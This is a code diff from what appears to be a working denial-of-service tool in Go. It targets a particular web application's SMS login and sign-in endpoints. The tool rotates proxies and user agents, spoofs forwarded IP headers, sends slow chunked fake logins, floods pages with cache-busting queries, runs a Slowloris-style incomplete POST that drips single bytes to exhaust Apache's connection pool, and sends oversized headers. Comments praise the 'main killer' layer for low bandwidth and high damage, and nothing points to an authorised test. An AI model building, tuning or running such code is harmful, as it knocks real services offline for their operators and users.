@@ -6,27 +6,20 @@ import (
 	"io"
 	"math/rand"
 	"net/http"
-	"net/url"
 	"strings"
 	"time"
 )
 
 // ============================================================
-// LAYER 1: FAKE LOGIN WITH SLOW CHUNKED BODY
-// Targets: POST /sms/signmein with massive fake credentials
-// Effect: PHP processes slow chunked body → max_execution_time exhaust
+// LAYER 1: LIGHT FAKE LOGIN — Slow chunked body (optimized)
 // ============================================================
 func layer1Chunked(ctx context.Context, o *Orchestrator, workerID int) error {
 	client := o.proxyMgr.NewClient()
 	client.Timeout = 0
 
-	targetURL := o.target.String()
-	// Ensure trailing slash
-	if !strings.HasSuffix(targetURL, "/") {
-		targetURL += "/"
-	}
-	targetURL += "sms/signmein"
-
+	baseURL := strings.TrimRight(o.target.String(), "/")
+	targetURL := baseURL + "/sms/signmein"
+	refererURL := baseURL + "/sms/SignIn"
 	layerIdx := 0
 
 	for {
@@ -36,7 +29,7 @@ func layer1Chunked(ctx context.Context, o *Orchestrator, workerID int) error {
 		default:
 		}
 
-		body := slowLoginBody()
+		body := lightSlowBody()
 
 		req, err := http.NewRequestWithContext(ctx, "POST", targetURL, body)
 		if err != nil {
@@ -50,7 +43,7 @@ func layer1Chunked(ctx context.Context, o *Orchestrator, workerID int) error {
 		req.Header.Set("Connection", "keep-alive")
 		req.Header.Set("Cache-Control", "no-cache")
 		req.Header.Set("Origin", o.target.Scheme+"://"+o.target.Host)
-		req.Header.Set("Referer", targetURL[:len(targetURL)-len("signmein")]+"SignIn")
+		req.Header.Set("Referer", refererURL)
 
 		resp, err := client.Do(req)
 		o.stats.TotalRequests.Add(1)
@@ -66,64 +59,34 @@ func layer1Chunked(ctx context.Context, o *Orchestrator, workerID int) error {
 		o.stats.SuccessRequests.Add(1)
 		o.stats.Layers[layerIdx].Success.Add(1)
 
-		time.Sleep(time.Duration(rand.Intn(50)+10) * time.Millisecond)
+		time.Sleep(time.Duration(rand.Intn(200)+100) * time.Millisecond)
 	}
 }
 
-func slowLoginBody() io.Reader {
+func lightSlowBody() io.Reader {
 	r, w := io.Pipe()
 	go func() {
 		defer w.Close()
-		w.Write([]byte("username=" + strings.Repeat("A", 2048)))
-		time.Sleep(time.Duration(rand.Intn(300)+100) * time.Millisecond)
-		w.Write([]byte("&password=" + strings.Repeat("B", 2048)))
-		time.Sleep(time.Duration(rand.Intn(300)+100) * time.Millisecond)
+		w.Write([]byte("username=" + strings.Repeat("A", 256)))
+		time.Sleep(time.Duration(rand.Intn(800)+400) * time.Millisecond)
+		w.Write([]byte("&password=" + strings.Repeat("B", 256)))
+		time.Sleep(time.Duration(rand.Intn(800)+400) * time.Millisecond)
 		w.Write([]byte(fmt.Sprintf("&capt=%d", rand.Intn(20)+1)))
-		for i := 0; i < 10; i++ {
-			time.Sleep(time.Duration(rand.Intn(200)+50) * time.Millisecond)
-			w.Write([]byte("&junk" + fmt.Sprintf("%d", i) + "=" + strings.Repeat("C", 512)))
+		for i := 0; i < 5; i++ {
+			time.Sleep(time.Duration(rand.Intn(500)+300) * time.Millisecond)
+			w.Write([]byte("&x" + fmt.Sprintf("%d", i) + "=" + strings.Repeat("Y", 64)))
 		}
 	}()
 	return r
 }
 
 // ============================================================
-// LAYER 2: CAPTCHA PAGE FLOOD + ASSET EXHAUSTION
-// All paths prefixed with /sms/
+// LAYER 2 + 3: MINIMAL — Just occasional SignIn hits
 // ============================================================
-var (
-	assetPaths = []string{
-		"/sms/SignIn",
-		"/sms/SignIn",
-		"/sms/SignIn",
-		"/sms/SignIn",
-		"/sms/SignIn",
-		"/sms/SignIn",
-		"/sms/app-assets/vendors/css/vendors.min.css",
-		"/sms/app-assets/css/bootstrap.css",
-		"/sms/app-assets/css/bootstrap-extended.css",
-		"/sms/app-assets/css/colors.css",
-		"/sms/app-assets/css/components.css",
-		"/sms/app-assets/css/core/menu/menu-types/vertical-menu.css",
-		"/sms/app-assets/css/core/colors/palette-gradient.css",
-		"/sms/app-assets/css/pages/login-register.css",
-		"/sms/assets/css/style.css",
-		"/sms/app-assets/vendors/js/vendors.min.js",
-		"/sms/app-assets/vendors/js/forms/validation/jqBootstrapValidation.js",
-		"/sms/app-assets/js/core/app-menu.js",
-		"/sms/app-assets/js/core/app.js",
-		"/sms/app-assets/js/scripts/forms/form-login-register.js",
-		"/sms/app-assets/images/logo/logo.png",
-		"/sms/app-assets/images/ico/favicon.ico",
-	}
-)
-
 func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
 	client := o.proxyMgr.NewClientWithTimeout(15 * time.Second)
-	baseURL := o.target.String()
-	if !strings.HasSuffix(baseURL, "/") {
-		baseURL += "/"
-	}
+	baseURL := strings.TrimRight(o.target.String(), "/")
+	targetURL := baseURL + "/sms/SignIn"
 	layerIdx := 1
 
 	for {
@@ -133,10 +96,7 @@ func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
 		default:
 		}
 
-		path := assetPaths[rand.Intn(len(assetPaths))]
-		// Remove leading slash since path already has it
-		fullURL := fmt.Sprintf("%s%s?_=%d&r=%d",
-			strings.TrimRight(baseURL, "/"), path, time.Now().UnixNano(), rand.Int63())
+		fullURL := fmt.Sprintf("%s?_=%d", targetURL, rand.Int63())
 
 		req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
 		if err != nil {
@@ -146,16 +106,9 @@ func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
 		}
 
 		req.Header.Set("User-Agent", randomUA())
-		req.Header.Set("Accept", "*/*")
+		req.Header.Set("Accept", "text/html")
 		req.Header.Set("Connection", "keep-alive")
 		req.Header.Set("Cache-Control", "no-cache")
-		req.Header.Set("Pragma", "no-cache")
-
-		if strings.Contains(path, "SignIn") {
-			req.Header.Set("Referer", baseURL+"sms/test/")
-		} else {
-			req.Header.Set("Referer", baseURL+"sms/SignIn")
-		}
 
 		resp, err := client.Do(req)
 		o.stats.TotalRequests.Add(1)
@@ -171,31 +124,16 @@ func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
 		o.stats.SuccessRequests.Add(1)
 		o.stats.Layers[layerIdx].Success.Add(1)
 
-		time.Sleep(time.Duration(rand.Intn(5)) * time.Millisecond)
+		// Longer delay — bandwidth bachane ke liye
+		time.Sleep(time.Duration(rand.Intn(100)+50) * time.Millisecond)
 	}
 }
 
-// ============================================================
-// LAYER 3: DASHBOARD + MISC PAGE FLOOD
-// All paths prefixed with /sms/
-// ============================================================
-var (
-	dashboardPaths = []string{
-		"/sms/test/",
-		"/sms/test/TestNumbers",
-		"/sms/test/TestReports",
-		"/sms/test/Profile",
-		"/sms/test/ActivityLog",
-		"/sms/",
-	}
-)
-
 func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error {
+	// Same as L2 — just additional pressure with different headers
 	client := o.proxyMgr.NewClientWithTimeout(10 * time.Second)
-	baseURL := o.target.String()
-	if !strings.HasSuffix(baseURL, "/") {
-		baseURL += "/"
-	}
+	baseURL := strings.TrimRight(o.target.String(), "/")
+	targetURL := baseURL + "/sms/SignIn"
 	layerIdx := 2
 
 	for {
@@ -205,9 +143,7 @@ func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error
 		default:
 		}
 
-		path := dashboardPaths[rand.Intn(len(dashboardPaths))]
-		fullURL := fmt.Sprintf("%s%s?_=%d&nc=%d",
-			strings.TrimRight(baseURL, "/"), path, time.Now().UnixNano(), rand.Int63())
+		fullURL := fmt.Sprintf("%s?_=%d", targetURL, rand.Int63())
 
 		req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
 		if err != nil {
@@ -217,12 +153,8 @@ func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error
 		}
 
 		req.Header.Set("User-Agent", randomUA())
-		req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
-		req.Header.Set("Pragma", "no-cache")
+		req.Header.Set("Accept", "text/html")
 		req.Header.Set("X-Forwarded-For", randomIP())
-		req.Header.Set("X-Real-IP", randomIP())
-		req.Header.Set("Accept", "text/html,application/xhtml+xml,*/*")
-		req.Header.Set("Referer", baseURL+"sms/SignIn")
 
 		resp, err := client.Do(req)
 		o.stats.TotalRequests.Add(1)
@@ -238,13 +170,13 @@ func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error
 		o.stats.SuccessRequests.Add(1)
 		o.stats.Layers[layerIdx].Success.Add(1)
 
-		time.Sleep(time.Duration(rand.Intn(5)) * time.Millisecond)
+		time.Sleep(time.Duration(rand.Intn(100)+50) * time.Millisecond)
 	}
 }
 
 // ============================================================
-// LAYER 4: APACHE CONNECTION POOL EXHAUSTION
-// Targets: /sms/SignIn via raw TCP
+// LAYER 4: APACHE CONNECTION POOL EXHAUSTION — MAIN KILLER
+// Sabse kam bandwidth, sabse zyada damage
 // ============================================================
 func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error {
 	layerIdx := 3
@@ -269,29 +201,31 @@ func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error
 		o.stats.SuccessRequests.Add(1)
 		o.stats.Layers[layerIdx].Success.Add(1)
 
-		partialReq := fmt.Sprintf(
-			"GET /sms/SignIn HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\nAccept: */*\r\n",
-			o.target.Host, randomUA(),
+		// Incomplete POST — Apache waits for Content-Length body
+		incompleteReq := fmt.Sprintf(
+			"POST /sms/signmein HTTP/1.1\r\nHost: %s\r\nContent-Length: 999999\r\nConnection: keep-alive\r\n\r\n",
+			o.target.Host,
 		)
 
-		conn.SetDeadline(time.Now().Add(10 * time.Second))
-		_, err = conn.Write([]byte(partialReq))
+		conn.SetDeadline(time.Now().Add(30 * time.Second))
+		_, err = conn.Write([]byte(incompleteReq))
 		if err != nil {
 			conn.Close()
 			continue
 		}
 
-		for i := 0; i < 5; i++ {
+		// VERY slow drip — bytes per second, connection stays for 20-30 seconds
+		for i := 0; i < 20; i++ {
 			select {
 			case <-ctx.Done():
 				conn.Close()
 				return ctx.Err()
-			case <-time.After(time.Duration(rand.Intn(2000)+500) * time.Millisecond):
+			case <-time.After(time.Duration(rand.Intn(1500)+500) * time.Millisecond):
 			}
 
 			conn.SetDeadline(time.Now().Add(5 * time.Second))
-			junkHeader := fmt.Sprintf("X-Junk-%d: %s\r\n", i, strings.Repeat("Z", 512))
-			if _, err := conn.Write([]byte(junkHeader)); err != nil {
+			// Send just 10 bytes per iteration — extremely slow
+			if _, err := conn.Write([]byte("x")); err != nil {
 				break
 			}
 		}
@@ -301,22 +235,12 @@ func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error
 }
 
 // ============================================================
-// LAYER 5: PARSER STRESS — OVERSIZED HEADERS
-// Targets: GET /sms/SignIn
+// LAYER 5: PARSER STRESS — Light version
 // ============================================================
-var oversizedHeaderNames = []string{
-	"X-Custom-Data", "X-Tracking-ID", "X-Session-Token",
-	"X-Analytics", "X-Device-Fingerprint", "X-Request-ID",
-	"X-Correlation-ID", "X-Debug-Info",
-}
-
 func layer5ParserStress(ctx context.Context, o *Orchestrator, workerID int) error {
 	client := o.proxyMgr.NewClientWithTimeout(20 * time.Second)
-	baseURL := o.target.String()
-	if !strings.HasSuffix(baseURL, "/") {
-		baseURL += "/"
-	}
-	targetURL := baseURL + "sms/SignIn"
+	baseURL := strings.TrimRight(o.target.String(), "/")
+	targetURL := baseURL + "/sms/SignIn"
 	layerIdx := 4
 
 	for {
@@ -334,23 +258,12 @@ func layer5ParserStress(ctx context.Context, o *Orchestrator, workerID int) erro
 		}
 
 		req.Header.Set("User-Agent", randomUA())
-		req.Header.Set("Connection", "keep-alive")
-		req.Header.Set("Referer", baseURL+"sms/test/")
-
-		oversizedValue := randomString(8192 + rand.Intn(8192))
-		req.Header.Set("X-Oversized-Data", oversizedValue)
-
-		for _, name := range oversizedHeaderNames {
-			if rand.Intn(2) == 0 {
-				req.Header.Set(name, randomString(4096+rand.Intn(4096)))
-			}
+		// Just one oversized header instead of many
+		req.Header.Set("X-Oversized-Data", randomString(4096))
+		// Fewer duplicate headers
+		for i := 0; i < 20; i++ {
+			req.Header.Add("X-Dup", "v")
 		}
-
-		for i := 0; i < 50; i++ {
-			req.Header.Add("X-Duplicate-Test", "value-"+intToStr(i))
-		}
-
-		req.Header.Set("Accept-Encoding", "gzip;q=0, identity;q=0, *;q=0, br;q=0")
 
 		resp, err := client.Do(req)
 		o.stats.TotalRequests.Add(1)
@@ -366,7 +279,7 @@ func layer5ParserStress(ctx context.Context, o *Orchestrator, workerID int) erro
 		o.stats.SuccessRequests.Add(1)
 		o.stats.Layers[layerIdx].Success.Add(1)
 
-		time.Sleep(time.Duration(rand.Intn(100)+20) * time.Millisecond)
+		time.Sleep(time.Duration(rand.Intn(200)+100) * time.Millisecond)
 	}
 }
 
@@ -375,14 +288,10 @@ func layer5ParserStress(ctx context.Context, o *Orchestrator, workerID int) erro
 // ============================================================
 
 var userAgents = []string{
-	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36",
-	"Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.110 Mobile Safari/537.36",
-	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
-	"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
-	"Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.146 Mobile Safari/537.36",
-	"Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
+	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/151.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/126.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5) AppleWebKit/605.1.15 Version/17.4 Safari/604.1",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0 Safari/537.36",
 }
 
 func randomUA() string {
@@ -403,5 +312,3 @@ func randomString(n int) string {
 	}
 	return string(b)
 }
-
-var _ = url.Parse
